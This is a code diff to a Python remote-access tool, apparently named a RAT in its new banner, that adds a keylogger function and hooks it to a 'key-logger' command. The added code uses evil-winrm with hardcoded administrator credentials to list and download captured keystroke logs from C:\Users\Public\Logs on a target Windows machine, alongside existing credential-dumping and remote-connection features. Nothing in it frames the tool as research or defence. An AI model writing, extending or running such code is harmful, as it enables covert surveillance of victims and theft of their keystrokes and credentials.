@@ -9,13 +9,22 @@ import ipaddress
 from datetime import datetime
 
 BANNER = r"""
-:::::::::  :::::::::   ::::::::  ::::::::::: :::::::::: :::::::: ::::::::::: 
-:+:    :+: :+:    :+: :+:    :+:     :+:     :+:       :+:    :+:    :+:     
-+:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+       +:+           +:+     
-+#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#  +#+           +#+     
-+#+        +#+    +#+ +#+    +#+     +#+     +#+       +#+           +#+     
-#+#        #+#    #+# #+#    #+# #+# #+#     #+#       #+#    #+#    #+#     
-###        ###    ###  ########   #####      ########## ########     ###     
+                .88888.              888888ba                                    
+               d8'   `88             88    `8b                                   
+               88                   a88aaaa8P'                                   
+               88   YP88  88888888   88   `8b.                                   
+               Y8.   .88             88     88                                   
+                `88888'              dP     dP                                   
+                                                                  
+                                                                  
+   888888ba  .d888888d888888P  d888888P.88888.  .88888. dP        
+   88    `8bd8'    88   88        88  d8'   `8bd8'   `8b88        
+  a88aaaa8P'88aaaaa88a  88        88  88     8888     8888        
+   88   `8b.88     88   88        88  88     8888     8888        
+   88     8888     88   88        88  Y8.   .8PY8.   .8P88        
+   dP     dP88     88   dP        dP   `8888P'  `8888P' 88888888P 
+                                                                  
+                                                                    
 """
 
 USERNAME = "Adm1nistrator"
@@ -146,7 +155,61 @@ def credential_dump(target_ip):
         )
         print(result.stdout)
     except:
-       print("[-] Failed to dump credentials") 
+       print("[-] Failed to dump credentials")
+       
+def keylogger(target_ip):
+    print("[*] Downloading keylogger logs...")
+
+    try:
+        import os
+        import shutil
+        
+        LOCAL_DIR = f"./Box/keylogger_{target_ip}"
+        
+        # Clear old logs if they exist
+        if os.path.exists(LOCAL_DIR):
+            shutil.rmtree(LOCAL_DIR)
+        os.makedirs(LOCAL_DIR)
+        
+        # Get list of remote files
+        payload = f'Get-ChildItem "C:\\\\Users\\\\Public\\\\Logs" -Filter "*.log" | Select-Object -ExpandProperty Name'
+        
+        result = subprocess.run(
+            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
+            input=payload,
+            text=True,
+            capture_output=True
+        )
+        
+        remote_files = [f.strip() for f in result.stdout.split('\n') if f.strip() and f.strip().endswith('.log')]
+        
+        if not remote_files:
+            print("[-] No log files found on remote system")
+            return
+        
+        print(f"[*] Found {len(remote_files)} log files. Downloading...")
+        
+        # Download all files
+        for filename in remote_files:
+            remote_path = f"C:\\Users\\Public\\Logs\\{filename}"
+            local_path = os.path.join(LOCAL_DIR, filename)
+            
+            payload = f'download "{remote_path}" "{local_path}"'
+            
+            subprocess.run(
+                ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
+                input=payload,
+                text=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            
+            print(f"[+] Downloaded {filename}")
+        
+        print(f"[+] All logs saved to {LOCAL_DIR}/")
+            
+    except Exception as e:
+        print(f"[-] Failed to download keylogger logs: {e}")
 
 def cli():
     username = getpass.getuser()
@@ -201,7 +264,10 @@ def cli():
                 current_target = connect_evil_winrm(current_target)
 
         elif cmd == "key-logger":
-            print("In progress...")
+            if not current_target:
+                print("[-] No target connected. Use 'listen' first.")
+            else:
+                keylogger(current_target)
 
         elif cmd == "screen-shot":
             if not current_target:
